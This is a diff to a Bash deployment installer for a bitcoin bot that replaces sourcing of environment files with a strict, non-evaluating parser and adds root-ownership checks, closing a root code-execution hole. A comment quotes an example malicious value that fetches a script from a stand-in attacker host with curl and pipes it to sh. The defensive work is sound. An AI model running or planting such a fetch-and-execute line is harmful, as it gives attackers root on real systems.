@@ -23,6 +23,160 @@ export COMPOSE_PROJECT_NAME=bitcoin-bot
 
 fail(){ echo "ERROR: $*" >&2; exit 1; }
 as_root(){ if [[ $EUID -eq 0 ]]; then "$@"; else sudo -n "$@"; fi; }
+
+# >>> BEGIN INLINED deploy/lib/envfile.sh (do not edit; see that file) >>>
+# Strict, non-evaluating reader for KEY=VALUE environment files.
+#
+# WHY THIS EXISTS
+#
+# The privileged installers previously did:
+#
+#     set -a
+#     source "$ENV_FILE"
+#     set +a
+#
+# `source` makes Bash *interpret* the file. Every value is shell code, so a
+# single line such as
+#
+#     COMMAND_HMAC_KEY=$(curl -s http://attacker/x | sh)
+#
+# executes as whatever user runs the installer. install_artifact.sh and
+# install_monitoring.sh escalate through `as_root`, so that is root.
+#
+# The old mode check (`stat -c '%a' == 600`) constrained permissions but never
+# ownership, and the rollback path sourced configuration snapshots under
+# /var/lib/bitcoin-bot/config-snapshots, which oracle_setup.sh chowns to the
+# unprivileged deployment user. Anyone able to write a snapshot could therefore
+# execute arbitrary code as root during the next upgrade or rollback.
+#
+# These helpers never evaluate a value. Assignment uses `printf -v`, which
+# writes the bytes literally, and every key is validated against a strict
+# identifier pattern before it is used as a variable name.
+#
+# Regression coverage: tests/test_env_file_parser.py
+
+env_file_fail() { echo "ERROR: $*" >&2; return 1; }
+
+# env_file_require_trusted FILE
+#
+# A file that a privileged process is about to read must be a real file, not a
+# symlink, owned by root, and not writable by group or other.
+env_file_require_trusted() {
+  local file=$1 owner mode
+  [[ -f "$file" && ! -L "$file" ]] || {
+    env_file_fail "environment file is missing or a symlink: $file"; return 1; }
+  owner=$(stat -c '%u' "$file" 2>/dev/null) || {
+    env_file_fail "cannot stat environment file: $file"; return 1; }
+  [[ "$owner" == "0" ]] || {
+    env_file_fail "environment file must be owned by root (uid 0), found uid $owner: $file"
+    return 1; }
+  mode=$(stat -c '%a' "$file" 2>/dev/null)
+  mode=${mode: -3}
+  case "$mode" in
+    600|640|400|440) ;;
+    *) env_file_fail "environment file must not be group- or world-writable (mode $mode): $file"
+       return 1 ;;
+  esac
+  return 0
+}
+
+# _env_file_unquote NAME
+#
+# Strips one balanced layer of single or double quotes. Nothing is expanded.
+_env_file_unquote() {
+  local __name=$1 __v=${!1}
+  if [[ ${#__v} -ge 2 ]]; then
+    if [[ ${__v:0:1} == '"' && ${__v: -1} == '"' ]]; then
+      __v=${__v:1:${#__v}-2}
+    elif [[ ${__v:0:1} == "'" && ${__v: -1} == "'" ]]; then
+      __v=${__v:1:${#__v}-2}
+    fi
+  fi
+  printf -v "$__name" '%s' "$__v"
+}
+
+# env_file_get FILE KEY
+#
+# Prints the literal value of KEY, or returns 1 when absent. The last
+# assignment wins, matching how `source` behaved for duplicate keys.
+env_file_get() {
+  local file=$1 want=$2 line key value found=1 result=''
+  [[ "$want" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
+    env_file_fail "invalid environment key requested: $want"; return 1; }
+  while IFS= read -r line || [[ -n "$line" ]]; do
+    line=${line%$'\r'}
+    line=${line#"${line%%[![:space:]]*}"}
+    [[ -z "$line" || "$line" == '#'* ]] && continue
+    [[ "$line" == *=* ]] || continue
+    key=${line%%=*}
+    key=${key%"${key##*[![:space:]]}"}
+    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
+    [[ "$key" == "$want" ]] || continue
+    value=${line#*=}
+    _env_file_unquote value
+    result=$value
+    found=0
+  done < "$file"
+  [[ $found -eq 0 ]] || return 1
+  printf '%s' "$result"
+  return 0
+}
+
+# env_file_pairs FILE
+#
+# Emits NUL-separated KEY=VALUE records for use as literal `env` arguments:
+#
+#     while IFS= read -r -d '' kv; do args+=("$kv"); done < <(env_file_pairs f)
+#     env -i "${args[@]}" some-command
+#
+# `env` treats each argument as data, so this replaces `set -a; source FILE`
+# inside a clean-environment subshell without ever evaluating a value.
+env_file_pairs() {
+  local file=$1 line key value lineno=0
+  while IFS= read -r line || [[ -n "$line" ]]; do
+    lineno=$((lineno + 1))
+    line=${line%$'\r'}
+    line=${line#"${line%%[![:space:]]*}"}
+    [[ -z "$line" || "$line" == '#'* ]] && continue
+    [[ "$line" == *=* ]] || {
+      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
+    key=${line%%=*}
+    key=${key%"${key##*[![:space:]]}"}
+    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
+      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
+    value=${line#*=}
+    _env_file_unquote value
+    printf '%s=%s\0' "$key" "$value"
+  done < "$file"
+  return 0
+}
+
+# env_file_load FILE
+#
+# Exports every well-formed KEY=VALUE pair, literally. A malformed key is
+# rejected outright rather than skipped, so a corrupt or tampered file fails
+# closed instead of silently loading a partial configuration.
+env_file_load() {
+  local file=$1 line key value lineno=0
+  while IFS= read -r line || [[ -n "$line" ]]; do
+    lineno=$((lineno + 1))
+    line=${line%$'\r'}
+    line=${line#"${line%%[![:space:]]*}"}
+    [[ -z "$line" || "$line" == '#'* ]] && continue
+    [[ "$line" == *=* ]] || {
+      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
+    key=${line%%=*}
+    key=${key%"${key##*[![:space:]]}"}
+    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
+      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
+    value=${line#*=}
+    _env_file_unquote value
+    printf -v "$key" '%s' "$value"
+    export "${key?}"
+  done < "$file"
+  return 0
+}
+# <<< END INLINED deploy/lib/envfile.sh <<<
 require_canonical_dir(){
   local path=$1 uid=$2 gid=$3 mode=$4 resolved
   [[ -d "$path" && ! -L "$path" ]] || fail "required directory is missing or a symlink: $path"
@@ -77,10 +231,11 @@ LOCK_FILE=/var/lock/bitcoin-bot.install.lock
 exec 9>"$LOCK_FILE" || fail "cannot open deployment lock $LOCK_FILE; run oracle_setup.sh first"
 flock -n 9 || fail "another install holds $LOCK_FILE"
 
-set -a
-# shellcheck disable=SC1090
-source "$ENV_FILE"
-set +a
+# Parsed as literal data. `source` would execute every value as shell
+# code with root privileges; see deploy/lib/envfile.sh.
+env_file_require_trusted "$ENV_FILE" || \
+  fail "$ENV_FILE must be a regular root-owned file that is not group- or world-writable"
+env_file_load "$ENV_FILE" || fail "$ENV_FILE is not a valid KEY=VALUE environment file"
 
 placeholder(){
   local upper=${1^^}
@@ -439,22 +594,24 @@ verify_live_candidate(){
   [[ -d "$release_dir" && ! -L "$release_dir" \
      && -f "$release_env" && ! -L "$release_env" \
      && -f "$source" && ! -L "$source" ]] || return 1
-  env -i "PATH=$PATH" "HOME=${HOME:-/tmp}" \
-    bash --noprofile --norc -c '
-      set -a
-      # shellcheck disable=SC1090
-      source "$1"
-      set +a
-      export PYTHONPATH="$2"
-      export SHARED_ROOT="$3"
-      export RUNTIME_DIR="$3/runtime/sidecar"
-      export ACTIVE_PAIR_FILE="$3/pair/active_pair.json"
-      export ENVELOPE_RELEASE_HASH="$4"
-      export LIVE_EVIDENCE_FILE="$5"
-      export LIVE_EVIDENCE_MIN_REMAINING_SECONDS="$6"
-      exec python3 "$2/scripts/verify_live_evidence.py" "$5"
-    ' bash "$release_env" "$release_dir" "$PERSIST" "$release_hash" \
-      "$source" "$minimum_remaining"
+  # The release env is converted to literal `env` arguments rather than
+  # sourced, so no value is ever interpreted as shell code. Explicit
+  # assignments follow the file so they still win on duplicate keys.
+  local -a release_env_pairs=()
+  local _kv
+  env_file_pairs "$release_env" >/dev/null || return 1
+  while IFS= read -r -d '' _kv; do
+    release_env_pairs+=("$_kv")
+  done < <(env_file_pairs "$release_env")
+  env -i "PATH=$PATH" "HOME=${HOME:-/tmp}" "${release_env_pairs[@]}" \
+    "PYTHONPATH=$release_dir" \
+    "SHARED_ROOT=$PERSIST" \
+    "RUNTIME_DIR=$PERSIST/runtime/sidecar" \
+    "ACTIVE_PAIR_FILE=$PERSIST/pair/active_pair.json" \
+    "ENVELOPE_RELEASE_HASH=$release_hash" \
+    "LIVE_EVIDENCE_FILE=$source" \
+    "LIVE_EVIDENCE_MIN_REMAINING_SECONDS=$minimum_remaining" \
+    python3 "$release_dir/scripts/verify_live_evidence.py" "$source"
 }
 
 if [[ "$EXECUTION_MODE" == live ]]; then
@@ -578,14 +735,17 @@ if [[ -L "$CURRENT" ]]; then
        && -z "$marker_extra" ]] || \
       fail 'current success marker does not match its release and config hashes'
     OLD_TAG="bitcoin-${OLD_HASH:0:16}"
-    OLD_EXECUTION_MODE=$(OLD_ENV="$OLD_CONFIG" bash --noprofile --norc -c \
-      'set -a; source "$OLD_ENV"; printf "%s" "${EXECUTION_MODE:-simulation}"')
+    # config-snapshots is writable by the deployment user, so sourcing it
+    # here would have escalated that user to root.
+    OLD_EXECUTION_MODE=$(env_file_get "$OLD_CONFIG" EXECUTION_MODE) \
+      || OLD_EXECUTION_MODE=simulation
+    [[ -n "$OLD_EXECUTION_MODE" ]] || OLD_EXECUTION_MODE=simulation
     case "$OLD_EXECUTION_MODE" in
       simulation|testnet|live) OLD_MONITOR_MODE=$OLD_EXECUTION_MODE ;;
       *) fail 'current release config snapshot has invalid EXECUTION_MODE' ;;
     esac
-    OLD_COMMAND_HMAC_KEY=$(OLD_ENV="$OLD_CONFIG" bash --noprofile --norc -c \
-      'set -a; source "$OLD_ENV"; printf "%s" "${COMMAND_HMAC_KEY:-}"')
+    OLD_COMMAND_HMAC_KEY=$(env_file_get "$OLD_CONFIG" COMMAND_HMAC_KEY) \
+      || OLD_COMMAND_HMAC_KEY=''
     [[ ${#OLD_COMMAND_HMAC_KEY} -ge 32 ]] || fail 'current release command key is missing or too short'
   else
     fail 'current release link is malformed; refusing an unsafe upgrade'
